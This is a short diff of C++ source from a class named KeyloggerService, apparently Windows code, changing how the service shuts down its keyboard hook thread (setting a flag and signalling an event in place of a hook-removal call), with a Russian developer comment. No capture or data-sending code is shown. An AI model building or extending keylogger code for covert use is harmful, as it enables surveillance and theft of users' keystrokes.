@@ -171,7 +171,9 @@ int KeyloggerService::main(const std::vector<std::string>& args)
 
     waitForTerminationRequest();
     // здесь нужно вызвать у HookThread функцию стоп
-    removelKeyboardHookProcess();
+    done = true;
+    SetEvent(doneEvent);
+    //WaitForSingleObject(doneEvent, INFINITY);
 
     while (!done_callback) {
         Sleep(500);
